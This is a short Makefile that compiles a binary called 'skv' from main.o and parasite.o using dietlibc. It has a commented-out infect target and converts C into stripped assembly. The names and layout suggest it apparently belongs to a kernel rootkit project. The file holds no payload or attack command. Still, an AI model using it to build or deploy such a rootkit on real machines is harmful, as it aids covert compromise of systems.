CC=dietlibc/bin/diet gcc
CFLAGS=-Wall -fno-builtin -nostdinc -O2 -fomit-frame-pointer -DNODIETREF -I../include -I../include/dietlibc/include
LDFLAGS=
# this is final base, don't touch unless you don't know
# what you're doing
BASE=0x5deadbee


#skv:	infect.o main.o parasite.o
skv:	main.o parasite.o
	$(CC) $(LDFLAGS) *.o -o skv

#infect.o: ../include/sktypes.h ../include/infect.h ../include/parasite.h ../include/config.h ../include/sk.h

main.o:

parasite.S: ../include/parasite.h


.c.o:
	$(CC) $(CFLAGS) -c $<
.S.o:
	$(CC) $(CFLAGS) -D__ASSEMBLY__ -c $<
.c.S:
	$(CC) $(CFLAGS) -nostdlib -c -S $< -o tmp.S
	@cat tmp.S | egrep -v "\.section|\.text|\.align|\.p2align" | sed -e 's/[^ ]*\.comm\([^,]*\),\([^,]*\),.*/.globl \1;\1:.zero \2 /g' -e 's/call[ 	]*__do_syscall/call __do_syscall;push %eax/g' > $@
	@rm -f tmp.S

clean:
	rm -f *.o skv core .depend _kernel.S

